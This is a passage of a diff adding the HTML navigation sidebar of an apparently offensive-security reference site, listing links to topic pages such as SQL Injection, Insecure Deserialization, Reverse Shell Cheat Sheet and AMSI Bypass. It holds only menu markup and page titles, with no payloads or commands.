+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../File%20Inclusion/" class="md-nav__link">
+        File Inclusion
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_20" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_20" id="__nav_20_label" tabindex="0">
+          GraphQL Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_20_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_20">
+          <span class="md-nav__icon md-icon"></span>
+          GraphQL Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../GraphQL%20Injection/" class="md-nav__link">
+        GraphQL Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_21" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_21" id="__nav_21_label" tabindex="0">
+          HTTP Parameter Pollution
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_21_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_21">
+          <span class="md-nav__icon md-icon"></span>
+          HTTP Parameter Pollution
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HTTP%20Parameter%20Pollution/" class="md-nav__link">
+        HTTP Parameter Pollution
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_22" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_22" id="__nav_22_label" tabindex="0">
+          Insecure Deserialization
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_22_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_22">
+          <span class="md-nav__icon md-icon"></span>
+          Insecure Deserialization
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Insecure%20Deserialization/" class="md-nav__link">
+        Insecure Deserialization
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Insecure%20Deserialization/DotNET/" class="md-nav__link">
+        .NET Serialization
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Insecure%20Deserialization/Java/" class="md-nav__link">
+        Java Deserialization
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Insecure%20Deserialization/Node/" class="md-nav__link">
+        Node Deserialization
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Insecure%20Deserialization/PHP/" class="md-nav__link">
+        PHP Deserialization
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Insecure%20Deserialization/Python/" class="md-nav__link">
+        Python Deserialization
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Insecure%20Deserialization/Ruby/" class="md-nav__link">
+        Ruby Deserialization
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Insecure%20Deserialization/YAML/" class="md-nav__link">
+        YAML Deserialization
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_23" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_23" id="__nav_23_label" tabindex="0">
+          Insecure Direct Object References
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_23_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_23">
+          <span class="md-nav__icon md-icon"></span>
+          Insecure Direct Object References
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Insecure%20Direct%20Object%20References/" class="md-nav__link">
+        Insecure Direct Object References
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_24" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_24" id="__nav_24_label" tabindex="0">
+          Insecure Management Interface
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_24_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_24">
+          <span class="md-nav__icon md-icon"></span>
+          Insecure Management Interface
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Insecure%20Management%20Interface/" class="md-nav__link">
+        Insecure Management Interface
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_25" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_25" id="__nav_25_label" tabindex="0">
+          Insecure Randomness
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_25_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_25">
+          <span class="md-nav__icon md-icon"></span>
+          Insecure Randomness
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Insecure%20Randomness/" class="md-nav__link">
+        Insecure Randomness
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_26" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_26" id="__nav_26_label" tabindex="0">
+          Insecure Source Code Management
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_26_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_26">
+          <span class="md-nav__icon md-icon"></span>
+          Insecure Source Code Management
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Insecure%20Source%20Code%20Management/" class="md-nav__link">
+        Insecure Source Code Management
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_27" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_27" id="__nav_27_label" tabindex="0">
+          JSON Web Token
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_27_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_27">
+          <span class="md-nav__icon md-icon"></span>
+          JSON Web Token
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../JSON%20Web%20Token/" class="md-nav__link">
+        JWT - JSON Web Token
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_28" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_28" id="__nav_28_label" tabindex="0">
+          Java RMI
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_28_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_28">
+          <span class="md-nav__icon md-icon"></span>
+          Java RMI
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Java%20RMI/" class="md-nav__link">
+        Java RMI
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_29" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_29" id="__nav_29_label" tabindex="0">
+          Kubernetes
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_29_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_29">
+          <span class="md-nav__icon md-icon"></span>
+          Kubernetes
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Kubernetes/" class="md-nav__link">
+        Kubernetes
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_30" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_30" id="__nav_30_label" tabindex="0">
+          LDAP Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_30_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_30">
+          <span class="md-nav__icon md-icon"></span>
+          LDAP Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../LDAP%20Injection/" class="md-nav__link">
+        LDAP Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_31" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_31" id="__nav_31_label" tabindex="0">
+          LaTeX Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_31_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_31">
+          <span class="md-nav__icon md-icon"></span>
+          LaTeX Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../LaTeX%20Injection/" class="md-nav__link">
+        LaTex Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_32" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_32" id="__nav_32_label" tabindex="0">
+          Mass Assignment
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_32_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_32">
+          <span class="md-nav__icon md-icon"></span>
+          Mass Assignment
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Mass%20Assignment/" class="md-nav__link">
+        Mass Assignment
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_33" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_33" id="__nav_33_label" tabindex="0">
+          Methodology and Resources
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_33_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_33">
+          <span class="md-nav__icon md-icon"></span>
+          Methodology and Resources
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Methodology%20and%20Resources/Active%20Directory%20Attack/" class="md-nav__link">
+        Active Directory Attacks
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet/" class="md-nav__link">
+        Bind Shell
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/" class="md-nav__link">
+        Cloud - AWS
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/" class="md-nav__link">
+        Cloud - Azure
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/" class="md-nav__link">
+        Cobalt Strike
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Methodology%20and%20Resources/Container%20-%20Docker%20Pentest/" class="md-nav__link">
+        Container - Docker Pentest
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Methodology%20and%20Resources/Container%20-%20Kubernetes%20Pentest/" class="md-nav__link">
+        Container - Kubernetes Pentest
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Methodology%20and%20Resources/Escape%20Breakout/" class="md-nav__link">
+        Application Escape and Breakout
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Methodology%20and%20Resources/HTML%20Smuggling/" class="md-nav__link">
+        HTML Smuggling
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Methodology%20and%20Resources/Hash%20Cracking/" class="md-nav__link">
+        Hash Cracking
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Methodology%20and%20Resources/Linux%20-%20Evasion/" class="md-nav__link">
+        Linux - Evasion
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Methodology%20and%20Resources/Linux%20-%20Persistence/" class="md-nav__link">
+        Linux - Persistence
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/" class="md-nav__link">
+        Linux - Privilege Escalation
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/" class="md-nav__link">
+        MSSQL Server
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet/" class="md-nav__link">
+        Metasploit
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Methodology%20and%20Resources/Methodology%20and%20enumeration/" class="md-nav__link">
+        Bug Hunting Methodology and Enumeration
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Methodology%20and%20Resources/Miscellaneous%20-%20Tricks/" class="md-nav__link">
+        Miscellaneous & Tricks
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Methodology%20and%20Resources/Network%20Discovery/" class="md-nav__link">
+        Network Discovery
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Methodology%20and%20Resources/Network%20Pivoting%20Techniques/" class="md-nav__link">
+        Network Pivoting Techniques
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Methodology%20and%20Resources/Office%20-%20Attacks/" class="md-nav__link">
+        Office - Attacks
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Methodology%20and%20Resources/Powershell%20-%20Cheatsheet/" class="md-nav__link">
+        Powershell
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/" class="md-nav__link">
+        Reverse Shell Cheat Sheet
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Methodology%20and%20Resources/Source%20Code%20Management/" class="md-nav__link">
+        Source Code Management & CI/CD Compromise
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Methodology%20and%20Resources/Subdomains%20Enumeration/" class="md-nav__link">
+        Subdomains Enumeration
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass/" class="md-nav__link">
+        AMSI Bypass
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Methodology%20and%20Resources/Windows%20-%20DPAPI/" class="md-nav__link">
+        Windows - DPAPI
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Methodology%20and%20Resources/Windows%20-%20Defenses/" class="md-nav__link">
+        Windows - Defenses
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute/" class="md-nav__link">
+        Windows - Download and execute methods
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Methodology%20and%20Resources/Windows%20-%20Mimikatz/" class="md-nav__link">
+        Windows - Mimikatz
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Methodology%20and%20Resources/Windows%20-%20Persistence/" class="md-nav__link">
+        Windows - Persistence
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/" class="md-nav__link">
+        Windows - Privilege Escalation
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Methodology%20and%20Resources/Windows%20-%20Using%20credentials/" class="md-nav__link">
+        Windows - Using credentials
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_34" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_34" id="__nav_34_label" tabindex="0">
+          NoSQL Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_34_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_34">
+          <span class="md-nav__icon md-icon"></span>
+          NoSQL Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../NoSQL%20Injection/" class="md-nav__link">
+        NoSQL Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_35" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_35" id="__nav_35_label" tabindex="0">
+          OAuth Misconfiguration
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_35_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_35">
+          <span class="md-nav__icon md-icon"></span>
+          OAuth Misconfiguration
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../OAuth%20Misconfiguration/" class="md-nav__link">
+        OAuth Misconfiguration
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_36" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_36" id="__nav_36_label" tabindex="0">
+          Open Redirect
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_36_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_36">
+          <span class="md-nav__icon md-icon"></span>
+          Open Redirect
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Open%20Redirect/" class="md-nav__link">
+        Open URL Redirection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_37" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_37" id="__nav_37_label" tabindex="0">
+          Prompt Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_37_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_37">
+          <span class="md-nav__icon md-icon"></span>
+          Prompt Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Prompt%20Injection/" class="md-nav__link">
+        Prompt Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_38" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_38" id="__nav_38_label" tabindex="0">
+          Prototype Pollution
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_38_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_38">
+          <span class="md-nav__icon md-icon"></span>
+          Prototype Pollution
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Prototype%20Pollution/" class="md-nav__link">
+        Prototype Pollution
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_39" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_39" id="__nav_39_label" tabindex="0">
+          Race Condition
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_39_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_39">
+          <span class="md-nav__icon md-icon"></span>
+          Race Condition
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Race%20Condition/" class="md-nav__link">
+        Race Condition
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_40" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_40" id="__nav_40_label" tabindex="0">
+          Request Smuggling
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_40_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_40">
+          <span class="md-nav__icon md-icon"></span>
+          Request Smuggling
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Request%20Smuggling/" class="md-nav__link">
+        Request Smuggling
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_41" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_41" id="__nav_41_label" tabindex="0">
+          SAML Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_41_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_41">
+          <span class="md-nav__icon md-icon"></span>
+          SAML Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../SAML%20Injection/" class="md-nav__link">
+        SAML Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_42" checked>
+      
+      
+      
+        <label class="md-nav__link" for="__nav_42" id="__nav_42_label" tabindex="0">
+          SQL Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_42_label" aria-expanded="true">
+        <label class="md-nav__title" for="__nav_42">
+          <span class="md-nav__icon md-icon"></span>
+          SQL Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../" class="md-nav__link">
+        SQL Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../BigQuery%20Injection/" class="md-nav__link">
+        Google BigQuery SQL Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Cassandra%20Injection/" class="md-nav__link">
+        Cassandra Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../DB2%20Injection/" class="md-nav__link">
+        DB2 Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HQL%20Injection/" class="md-nav__link">
+        Hibernate Query Language Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../MSSQL%20Injection/" class="md-nav__link">
+        MSSQL Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../MySQL%20Injection/" class="md-nav__link">
+        MYSQL Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
